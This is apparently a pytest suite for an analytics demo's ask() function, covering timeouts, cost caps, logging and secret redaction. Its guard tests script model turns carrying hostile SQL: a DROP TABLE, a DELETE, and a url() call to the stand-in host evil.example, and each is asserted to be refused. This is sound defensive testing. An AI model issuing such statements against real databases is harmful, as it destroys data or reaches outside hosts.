"""D4.1 `ask()`: ASK-01 (shape), ASK-04 (parallel, timeout, warm-up), ASK-05 (same guard and
allow-list, aggregate-only logs). Replay (ASK-02) is in test_cache.py, the guard (ASK-03) in
test_guard.py."""

from __future__ import annotations

import asyncio
import json
import logging
import time
import uuid
from dataclasses import dataclass

import pytest

from agentic_analytics.demo import ask as A
from agentic_analytics.demo.cache import load_example_cache
from agentic_analytics.models import ModelTurn, Usage
from agentic_analytics.schemas import AnalyticsAnswer, Execution
from tests.demo.helpers import SlowModel, context_with, fake_context, gpt_slow
from tests.mcp import fake_server
from tests.run import world as w

Q1 = "How many property sales were recorded in England and Wales in 2023?"


# ---- ASK-01 -----------------------------------------------------------------------------------


def test_ask_returns_one_analytics_answer_per_backend_in_order():
    cache = load_example_cache()
    answers = A.ask(Q1, ("cortex_analyst", "claude_mcp"), "replay", cache=cache)
    assert [type(a) for a in answers] == [AnalyticsAnswer, AnalyticsAnswer]
    assert [a.backend for a in answers] == ["cortex_analyst", "claude_mcp"]


def test_live_panels_carry_answer_cost_latency_and_bound():
    counter = w.Counter()
    ctx = fake_context(A.DEMO_BACKENDS, counter)
    panels = A.ask_panels(Q1, A.DEMO_BACKENDS, "live", ctx=ctx)
    assert [p.backend for p in panels] == list(A.DEMO_BACKENDS)
    for p in panels:
        assert p.ok and p.answer.sql and p.answer.chart is not None
        assert 0 < p.cost_usd <= p.bound_usd
        assert p.latency_ms >= 0 and p.rows is not None and p.rows_total == 1
    agent, cortex = panels
    assert agent.cost_usd < 0.05  # recorded turns, a few tenths of a cent each
    msg = 0.067 * 3.0  # one Cortex message at the planning $/credit
    assert cortex.cost_usd == pytest.approx(msg, rel=0.01)
    assert cortex.note == A.CORTEX_LINE
    assert counter.cortex_requests == 1 and counter.model_steps == 2


def test_ask_rejects_duplicate_or_missing_backends_and_unknown_modes():
    cache = load_example_cache()
    with pytest.raises(ValueError):
        A.ask(Q1, ("claude_mcp", "claude_mcp"), "replay", cache=cache)
    with pytest.raises(ValueError):
        A.ask(Q1, (), "replay", cache=cache)
    with pytest.raises(ValueError):
        A.ask(Q1, A.DEMO_BACKENDS, "batch", cache=cache)  # type: ignore[arg-type]


def test_live_question_limits():
    ctx = fake_context()
    with pytest.raises(ValueError, match="ask a question"):
        A.ask_panels("   ", A.DEMO_BACKENDS, "live", ctx=ctx)
    assert A.MAX_QUESTION_CHARS == 500
    with pytest.raises(ValueError, match="longer than 500"):
        A.ask_panels("x" * 501, A.DEMO_BACKENDS, "live", ctx=ctx)
    assert A.check_question("x" * 500) == "x" * 500
    with pytest.raises(ValueError, match="live services"):
        A.ask_panels(Q1, A.DEMO_BACKENDS, "live")


# ---- ASK-04 -----------------------------------------------------------------------------------


def test_backends_run_in_parallel():
    models = {"claude_mcp": SlowModel(delay=0.4), "gpt_mcp": gpt_slow(delay=0.4)}
    ctx = context_with(models, ("claude_mcp", "gpt_mcp"))
    t0 = time.perf_counter()
    panels = A.ask_panels("Which town?", ("claude_mcp", "gpt_mcp"), "live", ctx=ctx)
    wall = time.perf_counter() - t0
    assert all(p.ok and p.answer.clarification for p in panels)
    assert wall < 0.75, wall  # one delay, not two


def test_a_timed_out_panel_says_so_and_the_other_still_answers():
    slow = SlowModel(delay=0.8)  # would return 0.3 s after the cut-off if it were not cancelled
    ctx = context_with(
        {"claude_mcp": slow, "gpt_mcp": gpt_slow(0.0)}, ("claude_mcp", "gpt_mcp"), timeout_s=0.5
    )
    t0 = time.perf_counter()
    panels = A.ask_panels("Which town?", ("claude_mcp", "gpt_mcp"), "live", ctx=ctx)
    assert time.perf_counter() - t0 < 1.5
    late, quick = panels
    assert late.timed_out and late.answer.error == "timeout" and not late.ok
    assert "Timed out after 0.5 s" in (late.note or "") and late.latency_ms == 500
    assert quick.ok and not quick.timed_out
    # the hung turn is charged at its worst case (EK L-39), never more than the panel's bound
    assert late.cost_usd > 0.0 and late.cost_usd <= late.bound_usd
    time.sleep(0.6)  # well past the moment the hung turn would have returned
    assert slow.finished == 0 and slow.steps == 1  # cancelled: it never returned, no new turn


@dataclass
class _Stubborn(SlowModel):
    """A turn whose call ignores cancellation (as a blocking SDK call would) and returns a
    text-only turn, so the agent loop would ask for another turn at once."""

    cancelled: int = 0

    async def step(self, conv):  # type: ignore[override]
        self.steps += 1
        try:
            await asyncio.sleep(self.delay)
        except asyncio.CancelledError:
            self.cancelled += 1
        self.finished += 1
        return ModelTurn(text="thinking", tool_calls=(), stop="end", cost_usd=0.0,
                         usage=Usage(tokens_in=10, tokens_out=5), latency_ms=1,
                         model_snapshot="claude-sonnet-5-5")  # fmt: skip


def test_a_timed_out_agent_takes_no_turn_after_the_timeout_even_if_its_call_ignores_cancel():
    """Verifier round 1: the timeout stops the model (no later turn is sent) besides
    cancelling its task, so a call that swallows the cancel still ends the panel."""
    stubborn = _Stubborn(delay=5.0)
    ctx = context_with({"claude_mcp": stubborn}, ("claude_mcp",), timeout_s=0.5)
    (late,) = A.ask_panels("Which town?", ("claude_mcp",), "live", ctx=ctx)
    assert late.timed_out
    time.sleep(0.5)
    assert stubborn.cancelled == 1 and stubborn.finished == 1
    assert stubborn.steps == 1  # the loop's next turn was refused by the stopped model


@pytest.fixture
def budgeted(monkeypatch):
    """Every BudgetedModel the panels build, with the worst case priced for each turn."""
    made: list = []

    class Spy(A.BudgetedModel):
        def __init__(self, *a, **kw) -> None:
            super().__init__(*a, **kw)
            self.worst: list[float] = []
            made.append(self)

        async def step(self, conv):  # type: ignore[override]
            self.worst.append(A.step_bound_usd(self.price, self._next_in, self.max_output_tokens))
            return await super().step(conv)

    monkeypatch.setattr(A, "BudgetedModel", Spy)
    return made


def _clickhouse_timeout(ctx) -> float:
    return ctx.limits.timeout_s / 3600 * A._rate(ctx.rates, "clickhouse_usd_per_hour")


def test_each_agent_is_capped_at_its_bound_less_its_clickhouse_part(budgeted):
    ctx = fake_context(("claude_mcp", "gpt_mcp"))  # type: ignore[arg-type]
    A.ask_panels(Q1, ("claude_mcp", "gpt_mcp"), "live", ctx=ctx)
    for m, b in zip(budgeted, ("claude_mcp", "gpt_mcp"), strict=True):
        model_bound = A.model_bound_usd(b, config=ctx.config, prices=ctx.prices,
                                        limits=ctx.limits)  # fmt: skip
        assert m.cap_usd == pytest.approx(model_bound, rel=1e-12)
        panel = A.panel_bound_usd(b, config=ctx.config, prices=ctx.prices, rates=ctx.rates,
                                  limits=ctx.limits)  # fmt: skip
        assert m.cap_usd == pytest.approx(panel - _clickhouse_timeout(ctx), rel=1e-12)


def test_a_timed_out_agent_is_charged_its_in_flight_turn_plus_clickhouse_for_the_timeout(
    budgeted,
):
    ctx = context_with({"claude_mcp": SlowModel(delay=5.0)}, ("claude_mcp",), timeout_s=0.5)
    (late,) = A.ask_panels("Which town?", ("claude_mcp",), "live", ctx=ctx)
    ((worst,),) = [m.worst for m in budgeted]
    assert late.timed_out
    assert late.cost_usd == pytest.approx(worst + _clickhouse_timeout(ctx), rel=1e-12)


def test_the_default_timeout_is_25_seconds_inside_nfr2():
    assert A.PANEL_TIMEOUT_S == 25.0 < 30.0
    assert A.DemoLimits().timeout_s == 25.0


class _Exec:
    engine = "clickhouse"

    def __init__(self, fail: bool = False) -> None:
        self.calls: list[tuple[str, int]] = []
        self.fail = fail

    def execute(self, sql: str, *, row_cap: int) -> Execution:
        self.calls.append((sql, row_cap))
        if self.fail:
            return Execution(
                engine="clickhouse", sql=sql, result=None, rows_total=None, truncated=False,
                elapsed_ms=3, error="transport",
            )  # fmt: skip
        from agentic_analytics.schemas import ResultSet

        return Execution(
            engine="clickhouse", sql=sql, result=ResultSet(columns=("1",), rows=((1,),)),
            rows_total=1, truncated=False, elapsed_ms=3,
        )  # fmt: skip


def test_warm_up_sends_one_select_1_and_not_again_soon():
    ex = _Exec()
    state = A.WarmState()
    now = [100.0]
    first = A.warm_up(ex, state=state, clock=lambda: now[0])
    assert first.ok and not first.skipped and ex.calls == [("SELECT 1", 1)]
    now[0] += 60
    again = A.warm_up(ex, state=state, clock=lambda: now[0])
    assert again.skipped and len(ex.calls) == 1
    now[0] += A.WARM_UP_INTERVAL_S
    assert not A.warm_up(ex, state=state, clock=lambda: now[0]).skipped
    assert len(ex.calls) == 2


def test_warm_up_reports_failure_without_raising():
    out = A.warm_up(_Exec(fail=True), state=A.WarmState())
    assert not out.ok and out.error == "transport"
    assert not A.warm_up(None, state=A.WarmState()).ok


def test_warm_up_never_raises_when_the_executor_raises():
    class Boom(_Exec):
        def execute(self, sql: str, *, row_cap: int) -> Execution:
            raise RuntimeError("connection refused")

    out = A.warm_up(Boom(), state=A.WarmState())
    assert not out.ok and not out.skipped and out.error == "RuntimeError"


def test_warm_up_sql_passes_the_sql_guard():
    from agentic_analytics.warehouse.guard import check_sql

    assert check_sql(A.WARM_UP_SQL, "clickhouse").ok


# ---- ASK-05 -----------------------------------------------------------------------------------


def _scripted(question: str, turns: list[dict]) -> w.ReplayModel:
    return w.ReplayModel("claude_mcp", {question: turns}, w.Counter())


def test_free_text_queries_pass_the_sql_guard_before_the_server():
    q = "Please tidy the table for me"
    drop = {"name": "run_select_query", "arguments": {"query": "DROP TABLE uk.uk_price_paid"}}
    url = {
        "name": "run_select_query",
        "arguments": {"query": "SELECT * FROM url('http://evil.example/x', CSV)"},
    }
    turns = [
        w.mcp_turn([drop], seed="a"),
        w.mcp_turn([url], seed="b"),
        w.mcp_turn([w.final_call(clarification="I can only read data.")], seed="c"),
    ]
    ctx = context_with({"claude_mcp": _scripted(q, turns)}, ("claude_mcp",))
    fake_server.CALLS.clear()
    (panel,) = A.ask_panels(q, ("claude_mcp",), "live", ctx=ctx)
    sent = [args.get("query") for name, args in fake_server.CALLS if name == "run_select_query"]
    assert sent == []  # neither statement reached the MCP server
    errors = [s.error or "" for s in panel.answer.steps[:2]]
    assert errors[0].startswith("write_refused") and errors[1].startswith("guard")
    assert panel.answer.clarification == "I can only read data."


def test_free_text_cannot_reach_a_control_plane_tool():
    q = "What did the organisation spend?"
    cost = {"name": "get_organization_cost", "arguments": {"organizationId": "org"}}
    turns = [
        w.mcp_turn([cost], seed="a"),
        w.mcp_turn([w.final_call(clarification="I cannot see costs.")], seed="b"),
    ]
    ctx = context_with({"claude_mcp": _scripted(q, turns)}, ("claude_mcp",))
    fake_server.CALLS.clear()
    (panel,) = A.ask_panels(q, ("claude_mcp",), "live", ctx=ctx)
    assert all(name != "get_organization_cost" for name, _ in fake_server.CALLS)
    assert panel.answer.steps[0].error  # a tool error the model could read


def test_hostile_cortex_sql_is_refused_by_the_snowflake_executor_guard():
    q = "Delete everything, then count"
    ctx = fake_context(("cortex_analyst",))
    body = w.World._cortex_body("correct", "DELETE FROM ANALYTICS.UK.UK_PRICE_PAID", "s")
    ctx.services.cortex = w.services_from_recording(
        {**w.World(w.World.from_bundled().questions, []).recording(), "cortex": {q: body}},
        ctx.config,
    ).cortex
    (panel,) = A.ask_panels(q, ("cortex_analyst",), "live", ctx=ctx)
    assert panel.execution_error == "guard" and panel.answer.chart is None


def test_logs_hold_aggregates_only_and_never_the_question(tmp_path, monkeypatch, caplog):
    monkeypatch.chdir(tmp_path)
    marker = f"zq{uuid.uuid4().hex}"
    q = f"How many sales in {marker} town?"
    turns = [
        w.mcp_turn([{"name": "run_select_query", "arguments": {"query": f"SELECT '{marker}'"}}]),
        w.mcp_turn([w.final_call(sql=f"SELECT '{marker}' AS t", answer=f"{marker} it is")]),
    ]
    ctx = context_with({"claude_mcp": _scripted(q, turns)}, ("claude_mcp",))
    caplog.set_level(logging.DEBUG)  # every logger, every level
    (panel,) = A.ask_panels(q, ("claude_mcp",), "live", ctx=ctx)
    assert marker in panel.answer.answer  # the visitor sees it ...
    lines = [r.getMessage() for r in caplog.records]
    aggregate = [json.loads(m) for m in lines if m.startswith("{") and '"mode"' in m]
    assert aggregate and set(aggregate[-1]) == {
        "at",
        "mode",
        "backends",
        "latency_ms",
        "cost_usd",
        "outcome",
    }
    assert aggregate[-1]["mode"] == "live" and aggregate[-1]["backends"] == ["claude_mcp"]
    assert not any(marker in m for m in lines)  # ... no log line does
    for f in tmp_path.rglob("*"):
        if f.is_file():
            assert marker.encode() not in f.read_bytes(), f


def test_log_request_line_shape():
    line = A.log_request(
        mode="replay", backends=["claude_mcp"], latency_ms=3, cost_usd=0, outcome="ok"
    )
    data = json.loads(line)
    assert set(data) == {"at", "mode", "backends", "latency_ms", "cost_usd", "outcome"}


def test_a_failing_panel_is_readable_and_never_echoes_the_provider_message():
    class AuthenticationError(Exception):
        status_code = 401

    secret = "sk-ant-should-not-show"
    model = SlowModel(turns=[AuthenticationError(f"bad key {secret}")])
    ctx = context_with({"claude_mcp": model}, ("claude_mcp",))
    (panel,) = A.ask_panels("Which town?", ("claude_mcp",), "live", ctx=ctx)
    assert panel.answer.error == "transport" and not panel.ok
    assert panel.note == "the provider rejected the API key"
    assert secret not in panel.model_dump_json()


# ---- a failed panel is charged, and its error text never shows ----------------------------------

SECRET = "sk-ant-api03-" + "Zx9" * 12  # what a provider message could quote


def test_a_failed_agent_panel_is_charged_its_real_cost(tmp_path, budgeted):
    from evalkit.cost import price_for

    from agentic_analytics.cost import model_prices
    from tests.demo.helpers import SpyStore

    model = SlowModel(turns=[RuntimeError("provider exploded")])
    ctx = context_with({"claude_mcp": model}, ("claude_mcp",))
    store = SpyStore(tmp_path / "spend.sqlite")
    guard = A.make_guard({"DEMO_PASSCODE": "pw"}, store=store)
    (panel,) = A.ask_panels(
        "Which town?", ("claude_mcp",), "live", ctx=ctx, guard=guard, passcode="pw", session="s"
    )
    assert panel.answer.error == "transport" and not panel.ok and model.steps == 1
    _, p_out = A.worst_prices(price_for(model_prices(), "claude-sonnet-5-5"))
    floor = A.LIVE_MAX_OUTPUT_TOKENS * p_out / 1_000_000  # the failed turn's output part alone
    assert floor <= panel.cost_usd <= panel.bound_usd  # held at its worst case, not free
    ((worst,),) = [m.worst for m in budgeted]  # plus its ClickHouse part: queries may have run
    assert panel.cost_usd == pytest.approx(worst + _clickhouse_timeout(ctx), rel=1e-12)
    ((reserved, actual),) = store.settled
    assert actual == pytest.approx(panel.cost_usd) and 0 < actual < reserved


@pytest.mark.parametrize(
    "exc",
    [
        RuntimeError(f"upstream said: invalid x-api-key {SECRET}"),
        ValueError(f"bad request for key {SECRET}"),
        KeyError(SECRET),
        OSError(f"proxy refused Authorization: Bearer {SECRET}"),
        ConnectionError(f"reset while sending {SECRET}"),  # retried, then `transport`
        TimeoutError(SECRET),
    ],
    ids=lambda e: type(e).__name__,
)
def test_provider_error_text_never_reaches_a_panel_or_the_page(exc):
    model = SlowModel(turns=[exc, exc, exc, exc])
    ctx = context_with({"claude_mcp": model}, ("claude_mcp",))
    (panel,) = A.ask_panels("Which town?", ("claude_mcp",), "live", ctx=ctx)
    assert not panel.ok
    assert SECRET not in panel.model_dump_json()


def test_a_failing_cortex_call_never_shows_its_message(monkeypatch):
    async def boom(*a, **k):
        raise RuntimeError(f"Snowflake said: token {SECRET} expired")

    monkeypatch.setattr("agentic_analytics.backends.cortex.ask_cortex", boom)
    ctx = fake_context(("cortex_analyst",))
    (panel,) = A.ask_panels("Which town?", ("cortex_analyst",), "live", ctx=ctx)
    assert panel.note == "failed (RuntimeError)" and panel.cost_usd == panel.bound_usd
    assert SECRET not in panel.model_dump_json()


# ---- the question's characters ------------------------------------------------------------------


@pytest.mark.parametrize(
    "bad",
    [
        "\x00",  # NUL
        "\x07",  # BEL
        "\x1b[31m",  # ESC: terminal escapes in logs
        "\x7f",  # DEL
        "\x85",  # NEL (C1)
        "\x0b",  # vertical tab
        "\x1f",  # unit separator (str.split() would treat it as whitespace)
        "‮",  # RIGHT-TO-LEFT OVERRIDE (bidi)
        "⁦",  # LEFT-TO-RIGHT ISOLATE (bidi)
        "​",  # ZERO WIDTH SPACE
        "‍",  # ZERO WIDTH JOINER
        "﻿",  # BOM
        "­",  # SOFT HYPHEN
        "\ud800",  # lone surrogate
    ],
    ids=repr,
)
def test_check_question_refuses_control_and_format_characters(bad):
    with pytest.raises(ValueError, match="control or invisible"):
        A.check_question(f"How many sales{bad} in Leeds?")


def test_check_question_keeps_ordinary_text_and_collapses_line_breaks():
    assert A.check_question("  Prix médian à Leeds —\n2024?\t ") == "Prix médian à Leeds — 2024?"
    assert A.check_question("Sales in Ynys Môn, 2023 (£)?") == "Sales in Ynys Môn, 2023 (£)?"


def test_a_control_character_is_refused_before_any_call_on_the_live_path():
    counter = w.Counter()
    ctx = fake_context(A.DEMO_BACKENDS, counter)
    with pytest.raises(ValueError):
        A.ask_panels("How many‮ sales?", A.DEMO_BACKENDS, "live", ctx=ctx)
    assert counter.total == 0
